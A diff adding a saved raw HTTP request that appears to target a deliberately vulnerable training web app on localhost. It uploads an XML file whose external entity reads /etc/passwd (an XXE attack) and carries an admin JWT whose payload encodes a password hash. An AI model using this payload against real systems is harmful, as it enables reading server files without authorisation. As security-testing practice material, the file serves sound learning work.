@@ -1,0 +1,30 @@
+POST /file-upload HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNC0xMi0wNiAxNDoxMDoxMi4zMzMgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNC0xMi0wNiAxNDoxMDoxMi4zMzMgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzMzNTgwMTgwLCJleHAiOjE3MzM1OTgxODB9.xQuzcrgnxTJhg9JjMu6G0nAhS-46n76kfzrQ727PSl4zQ8CnDXB8axaLazB0w0uk6VH9PANoEu6ZD2jZtZNOBLuzVS3BdudMDcmbsb3fu9D-zzZTkucrnCxmKoATQp0hH8QpT9dMnPvzi2i1tjK95hY0b4rHAiYc-a9lMwpWzR4
+Content-Type: multipart/form-data; boundary=---------------------------423291533824473734391766757381
+Content-Length: 357
+Origin: http://localhost:3000
+Connection: keep-alive
+Referer: http://localhost:3000/
+Cookie: io=OYNP8msi3fU9DPPcAAAD; language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNC0xMi0wNiAxNDoxMDoxMi4zMzMgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNC0xMi0wNiAxNDoxMDoxMi4zMzMgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzMzNTgwMTgwLCJleHAiOjE3MzM1OTgxODB9.xQuzcrgnxTJhg9JjMu6G0nAhS-46n76kfzrQ727PSl4zQ8CnDXB8axaLazB0w0uk6VH9PANoEu6ZD2jZtZNOBLuzVS3BdudMDcmbsb3fu9D-zzZTkucrnCxmKoATQp0hH8QpT9dMnPvzi2i1tjK95hY0b4rHAiYc-a9lMwpWzR4
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+
+-----------------------------423291533824473734391766757381
+Content-Disposition: form-data; name="file"; filename="test.xml"
+Content-Type: text/xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<test>
+   <data>&xxe;</data>
+</test>
+-----------------------------423291533824473734391766757381--
